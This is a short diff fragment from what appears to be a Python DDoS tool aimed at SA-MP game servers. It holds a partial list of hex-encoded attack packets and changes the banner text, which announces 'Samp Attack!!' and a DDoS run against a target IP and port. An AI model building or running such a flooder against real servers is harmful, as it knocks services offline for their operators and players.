@@ -25,7 +25,8 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        ]
 
 
-print('Credits Dresson ! Gw Hanya Mengganti Bahasa')
+print('\u001b[33mCredits : Dresson ! Gw Hanya Mengganti Bahasa')
+print(' \u001b[34mSamp Attack!!')
 print(" \u001b[31mPROSES DDOS IP : %s Port: %s"%(orgip,port))
 
             
